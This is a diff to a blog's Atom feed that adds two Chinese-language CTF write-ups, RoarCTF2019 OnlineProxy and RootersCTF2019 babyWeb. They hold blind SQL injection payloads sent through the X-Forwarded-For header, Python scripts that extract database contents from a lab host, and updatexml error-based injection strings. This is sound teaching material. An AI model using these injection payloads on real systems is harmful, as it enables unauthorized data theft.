@@ -95,6 +95,10 @@
     <category term="Padding oracle attack 与CBC翻转字节攻击" />
     <category term="php" />
     <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
     <entry>
         <id>http://odiws.github.io/2025/02/23/HFCTF-2021-Final-hatenum/</id>
         <title>[HFCTF_2021_Final]hatenum</title>
@@ -263,6 +267,196 @@ INSERT INTO products VALUES(&#39;oculus-rift&#39;, sha256(....), ....);
         <category term="sqlmap使用" />
         <category term="SQL注入" />
         <updated>2024-11-10T08:03:42.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/08/28/RoarCTF2019-OnlineProxy/</id>
+        <title>[RoarCTF2019]OnlineProxy</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/28/RoarCTF2019-OnlineProxy/"/>
+        <content type="html">&lt;h2 id=&#34;roarctf2019onlineproxy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf2019onlineproxy&#34;&gt;#&lt;/a&gt; [RoarCTF2019]OnlineProxy&lt;/h2&gt;
+&lt;p&gt;这里发现通过修改 X-FORWARDED-FOR 的值注释部分的内容也随之改变&lt;/p&gt;
+&lt;p&gt;尝试盲注，上传命令时第一次为 Current Ip 发现并不能执行，再次上传 Current Ip 时上次的 Current Ip 变为 Last Ip 也没有执行，再次 send 即可正常执行命令&lt;/p&gt;
+&lt;p&gt;简单尝试使用盲注得到所有库名，这里可以看到该方法是没问题的&lt;/p&gt;
+&lt;p&gt;爆破库名：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&amp;gt;1 or &#39;0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
+head = &amp;#123;
+	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
+	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
+	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
+&amp;#125;
+result = &amp;quot;&amp;quot;
+for i in range(1,100):
+	l = 1
+	r = 127
+	mid = (l+r)&amp;gt;&amp;gt;1
+	while(l&amp;lt;r):
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = &amp;quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;.format(i,mid)
+		html_0 = requests.post(url,headers = head)
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = &amp;quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;.format(i, mid+1)
+		html_0 = requests.post(url, headers=head)
+		html_0 = requests.post(url, headers=head)
+		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
+			l= mid+1
+		else:
+			r=mid
+		mid = (l+r)&amp;gt;&amp;gt;1
+	if(chr(mid)==&#39; &#39;):
+		break
+	result+=chr(mid)
+	print(result)
+print(&amp;quot;table_name:&amp;quot;+result)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;爆破表名：&lt;/p&gt;
+&lt;p&gt;爆破表名：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;F4l9_D4t4B45e&#39;)),1,1))&amp;gt;1 or &#39;0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
+head = &amp;#123;
+	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
+	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
+	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
+&amp;#125;
+result = &amp;quot;&amp;quot;
+urls =&amp;quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x46346c395f4434743442343565),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;
+for i in range(1,100):
+	l = 1
+	r = 127
+	mid = (l+r)&amp;gt;&amp;gt;1
+	while(l&amp;lt;r):
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i,mid)
+		html_0 = requests.post(url,headers = head)
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i, mid+1)
+		html_0 = requests.post(url, headers=head)
+		html_0 = requests.post(url, headers=head)
+		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
+			l= mid+1
+		else:
+			r=mid
+		mid = (l+r)&amp;gt;&amp;gt;1
+	if(chr(mid)==&#39; &#39;):
+		break
+	result+=chr(mid)
+	print(result)
+print(&amp;quot;table_name:&amp;quot;+result)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查列名：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F4l9_t4b1e&#39;)),1,1))&amp;gt;1 or &#39;0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
+head = &amp;#123;
+	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
+	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
+	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
+&amp;#125;
+result = &amp;quot;&amp;quot;
+urls =&amp;quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=0x46346c395f4434743442343565),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;
+for i in range(1,100):
+	l = 1
+	r = 127
+	mid = (l+r)&amp;gt;&amp;gt;1
+	while(l&amp;lt;r):
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i,mid)
+		html_0 = requests.post(url,headers = head)
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i, mid+1)
+		html_0 = requests.post(url, headers=head)
+		html_0 = requests.post(url, headers=head)
+		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
+			l= mid+1
+		else:
+			r=mid
+		mid = (l+r)&amp;gt;&amp;gt;1
+	if(chr(mid)==&#39; &#39;):
+		break
+	result+=chr(mid)
+	print(result)
+print(&amp;quot;table_name:&amp;quot;+result)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查 Flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),1,1))&amp;gt;1 or &#39;0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
+head = &amp;#123;
+	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
+	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
+	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
+&amp;#125;
+result = &amp;quot;&amp;quot;
+urls =&amp;quot;0&#39; or ascii(substr((select F4l9_C01uMn from F4l9_D4t4B45e.F4l9_t4b1e limit 1,1),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;
+for i in range(1,100):
+	l = 1
+	r = 127
+	mid = (l+r)&amp;gt;&amp;gt;1
+	while(l&amp;lt;r):
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i,mid)
+		html_0 = requests.post(url,headers = head)
+		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i, mid+1)
+		html_0 = requests.post(url, headers=head)
+		html_0 = requests.post(url, headers=head)
+		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
+			l= mid+1
+		else:
+			r=mid
+		mid = (l+r)&amp;gt;&amp;gt;1
+	if(chr(mid)==&#39; &#39;):
+		break
+	result+=chr(mid)
+	print(result)
+print(&amp;quot;table_name:&amp;quot;+result)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;参考链接：[BUUCTF–&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTg4OTIxMjY=&#34;&gt;RoarCTF 2019] Online Proxy_onlineproxy ctf-CSDN 博客&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sql注入" />
+        <updated>2024-08-28T13:58:14.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/08/17/RootersCTF2019-babyWeb/</id>
+        <title>[RootersCTF2019]babyWeb</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/17/RootersCTF2019-babyWeb/"/>
+        <content type="html">&lt;h2 id=&#34;rootersctf2019babyweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019babyweb&#34;&gt;#&lt;/a&gt; [RootersCTF2019]babyWeb&lt;/h2&gt;
+&lt;p&gt;分析&lt;br&gt;
+页面中告诉我们要找一串数字输进去，且过滤了一些关键词。&lt;/p&gt;
+&lt;p&gt;UNION 被过滤了说明堆叠注入没法用了，并且他还把 sql 语句给我们了，那大概率是报错注入了，试下看看。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE uniqueid=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;果然是报错注入，这边的 || 功能和 and 一样，用 and 也一样。&lt;/p&gt;
+&lt;p&gt;果然是报错注入，这边的 || 功能和 and 一样，用 and 也一样。&lt;/p&gt;
+&lt;p&gt;接下来就慢慢构造呗，这边有一个小的知识点，题目虽然过滤了引号，但我们可以用 16 进制来达到同样的目的。&lt;br&gt;
+例如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;table_name=&#39;users&#39; 和 table_name=0x7573657273 功能一样
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;爆库：sql_injection
+1||(updatexml(1,concat(0x3a,(select SCHEMA_NAME from information_schema.schemata limit 3,1)),1))#
+
+爆表：users
+1||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#
+
+列字段：USER CURRENT_CONNECTIONS TOTAL_CONNECTIONS user uniqueid
+1||(updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1)),1))#
+
+取值：
+1||(updatexml(1,concat(0x3a,(select uniqueid from sql_injection.users limit 0,1)),1))#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;flag&lt;br&gt;
+ 最后在 sql_injection.users 的 uniqueid 字段里找到一串数字&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/07746c13342ba1f37eb52108ca8fc643.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
+&lt;p&gt;输入到主页的框里就可以拿到 flag 了。、&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/d4d45ec7b5864f722f0c8e70ab56dbab.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaW55Z29kL2FydGljbGUvZGV0YWlscy8xMjY5MzcxNjg=&#34;&gt;https://blog.csdn.net/shinygod/article/details/126937168&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sql注入" />
+        <updated>2024-08-17T12:22:01.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/06/20/Mars/</id>
